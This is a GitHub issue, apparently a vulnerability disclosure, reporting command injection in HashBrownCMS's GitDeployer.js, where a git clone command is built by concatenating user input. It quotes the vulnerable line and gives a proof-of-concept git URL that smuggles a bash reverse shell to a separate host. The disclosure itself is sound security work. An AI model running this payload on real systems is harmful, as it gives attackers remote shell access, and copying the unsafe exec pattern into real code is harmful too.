## Description

![@ufo009e](https://avatars.githubusercontent.com/u/28886089?v=4&size=48)[ufo009e](https://github.com/ufo009e)opened [on Jan 12, 2020](https://github.com/HashBrownCMS/hashbrown-cms/issues/326#issue-548535998)

In file src/Server/Entity/Deployer/GitDeployer.js: await HashBrown.Service.AppService.exec('git clone '' + url + '' '' + repoPath + ''');

The url, username, password and other parameters accept value without proper security check. If I set the git url to something like "10.154.159.166/git' $(bash -c 'bash -i >& /dev/tcp/10.154.159.161/8888 0>&1' &)", then when click media to trigger gitpull I can get a reverse shell.
